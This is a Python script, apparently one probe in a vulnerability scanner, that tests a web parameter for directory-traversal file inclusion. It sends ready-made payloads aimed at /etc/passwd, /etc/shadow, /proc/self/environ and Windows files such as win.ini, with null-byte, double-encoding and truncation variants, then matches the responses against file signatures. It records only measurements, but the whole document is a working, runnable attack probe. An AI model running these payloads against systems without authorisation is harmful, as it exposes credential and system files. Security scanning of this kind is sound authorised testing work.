#!/usr/bin/env python3
"""LFI via directory traversal — send path traversal payloads and check for known file signatures.

Output: measurements only; no status or confidence.
Exit codes: 0 = probes completed.
"""

import hashlib
import json
import sys
import time
import urllib.request
import urllib.error
import urllib.parse

# Configuration — replace before running
TARGET_URL = "http://localhost:3000/view"
PARAM = "file"
OS = "linux"  # linux or windows
AUTH_HEADER = ""  # Optional

# Traversal payloads and target files per OS
LINUX_PROBES = [
    ("etc_passwd_3", "../../../etc/passwd"),
    ("etc_passwd_6", "../../../../../../etc/passwd"),
    ("etc_passwd_10", "../../../../../../../../../../etc/passwd"),
    ("etc_passwd_null", "../../../../../../etc/passwd%00"),
    ("etc_passwd_double_encode", "..%252f..%252f..%252f..%252fetc/passwd"),
    ("etc_passwd_dot_truncate", "../../../../../../etc/passwd..........................................."),
    ("etc_shadow", "../../../../../../etc/shadow"),
    ("proc_self_environ", "../../../../../../proc/self/environ"),
    ("proc_self_cmdline", "../../../../../../proc/self/cmdline"),
    ("etc_hosts", "../../../../../../etc/hosts"),
]

WINDOWS_PROBES = [
    ("win_ini_3", "..\\..\\..\\windows\\win.ini"),
    ("win_ini_6", "..\\..\\..\\..\\..\\..\\windows\\win.ini"),
    ("win_ini_forward", "../../../../../../windows/win.ini"),
    ("system_ini", "../../../../../../windows/system.ini"),
    ("hosts", "../../../../../../windows/system32/drivers/etc/hosts"),
    ("boot_ini", "../../../../../../boot.ini"),
    ("win_ini_null", "..\\..\\..\\..\\..\\..\\windows\\win.ini%00"),
    ("win_ini_double_encode", "..%255c..%255c..%255cwindows%255cwin.ini"),
]

# Literal response markers recorded without interpreting their cause
LINUX_SIGNATURES = [
    ("passwd_entry", "root:x:0:0"),
    ("passwd_nologin", "/nologin"),
    ("passwd_bash", "/bin/bash"),
    ("shadow_hash", "$6$"),
    ("shadow_entry", "root:"),
    ("proc_environ_path", "PATH="),
    ("proc_environ_home", "HOME="),
    ("hosts_localhost", "127.0.0.1"),
]

WINDOWS_SIGNATURES = [
    ("win_ini_fonts", "[fonts]"),
    ("win_ini_extensions", "[extensions]"),
    ("system_ini_boot", "[boot]"),
    ("system_ini_drivers", "[drivers]"),
    ("hosts_localhost", "127.0.0.1"),
    ("boot_ini_loader", "[boot loader]"),
    ("boot_ini_os", "[operating systems]"),
]


def make_request(url, param, value, headers=None):
    """Send GET request with traversal payload as parameter value."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    new_query = urllib.parse.urlencode(params, doseq=True)
    final_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

    req = urllib.request.Request(final_url)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    start = time.monotonic()
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": resp.status,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": e.code,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }, body
    except Exception as e:
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": 0,
            "elapsed_ms": elapsed,
            "body_hash": "",
            "body_length": 0,
            "error": str(e),
        }, ""


def main():
    started_at = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    headers = {}
    if AUTH_HEADER:
        headers["Authorization"] = AUTH_HEADER

    target_os = OS.lower()
    probes = LINUX_PROBES if target_os == "linux" else WINDOWS_PROBES
    signatures = LINUX_SIGNATURES if target_os == "linux" else WINDOWS_SIGNATURES

    probe_count = 0

    # Step 1: Baseline — request with benign filename
    probe_count += 1
    baseline_round, baseline_body = make_request(TARGET_URL, PARAM, "ensphere_baseline.txt", headers)
    print(f"[BASELINE] status={baseline_round['status_code']}, len={baseline_round['body_length']}", file=sys.stderr)

    # Step 2: Traversal probes
    probe_results = []
    for name, payload in probes:
        probe_count += 1
        rr, body = make_request(TARGET_URL, PARAM, payload, headers)
        matched = [(sig_name, sig) for sig_name, sig in signatures if sig in body]
        print(f"[PROBE:{name}] status={rr['status_code']}, len={rr['body_length']}, matches={len(matched)}", file=sys.stderr)
        time.sleep(0.3)

        probe_results.append({
            "name": name,
            "payload": payload,
            "round": rr,
            "matched_signatures": [m[0] for m in matched],
            "hash_matches_baseline": rr["body_hash"] == baseline_round["body_hash"],
            "length_delta": rr["body_length"] - baseline_round["body_length"],
        })

    result = {
        "vuln_type": "lfi",
        "technique": "directory_traversal",
        "started_at": started_at,
        "probe_count": probe_count,
        "measurements": {
            "target_os": target_os,
            "baseline": baseline_round,
            "traversal_probes": probe_results,
            "probes_tested": len(probes),
            "signatures_checked": len(signatures),
        },
    }

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
